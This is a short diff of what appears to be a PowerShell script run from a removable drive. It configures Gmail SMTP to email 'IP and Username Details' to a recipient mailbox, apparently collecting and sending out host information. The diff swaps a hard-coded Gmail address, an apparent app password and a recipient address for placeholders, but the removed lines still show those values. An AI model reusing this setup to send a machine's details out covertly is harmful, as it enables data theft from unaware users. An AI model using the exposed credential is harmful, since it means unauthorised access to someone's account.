@@ -66,10 +66,10 @@ if ($driveLetter) {
     # Email configuration
     $smtpServer = "smtp.gmail.com"
     $smtpPort = 587
-    $smtpUsername = "johnatom336@gmail.com"
-    $smtpPassword = "ygthncnfxnumudwz"
-    $sendermail = "johnatom336@gmail.com"
-    $recipient = "mail.toxysec@gmail.com"
+    $smtpUsername = "Your-Email"
+    $smtpPassword = "Your-Pass"
+    $sendermail = "Your-Email"
+    $recipient = "Recipient Mail"
     $subject = "IP and Username Details"
     $body = "Please find attached IP and username details."
 
